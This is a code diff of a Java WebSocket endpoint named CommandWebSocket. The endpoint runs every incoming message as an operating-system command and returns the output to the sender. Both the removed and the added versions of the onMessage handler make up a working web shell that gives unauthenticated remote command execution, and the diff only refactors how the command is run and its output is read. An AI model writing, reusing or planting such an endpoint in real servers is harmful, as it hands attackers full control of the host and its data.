@@ -4,6 +4,7 @@ import javax.websocket.Endpoint;
 import javax.websocket.EndpointConfig;
 import javax.websocket.MessageHandler;
 import javax.websocket.Session;
+import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
 
 /**
@@ -16,25 +17,22 @@ public class CommandWebSocket extends Endpoint implements MessageHandler.Whole<S
 
     private Session session;
 
+    private String getParam(String param) {
+        return param;
+    }
+
     @Override
     public void onMessage(String s) {
         try {
-            Process process;
-            boolean bool = System.getProperty("os.name").toLowerCase().startsWith("windows");
-            if (bool) {
-                process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", s});
-            } else {
-                process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", s});
+            Process exec = Runtime.getRuntime().exec(getParam(s));
+            InputStream inputStream = exec.getInputStream();
+            byte[] buf = new byte[8192];
+            int length;
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            while ((length = inputStream.read(buf)) != -1) {
+                outputStream.write(buf, 0, length);
             }
-            InputStream inputStream = process.getInputStream();
-            StringBuilder stringBuilder = new StringBuilder();
-            int i;
-            while ((i = inputStream.read()) != -1) {
-                stringBuilder.append((char) i);
-            }
-            inputStream.close();
-            process.waitFor();
-            session.getBasicRemote().sendText(stringBuilder.toString());
+            session.getBasicRemote().sendText(outputStream.toString());
         } catch (Exception e) {
             e.printStackTrace();
         }
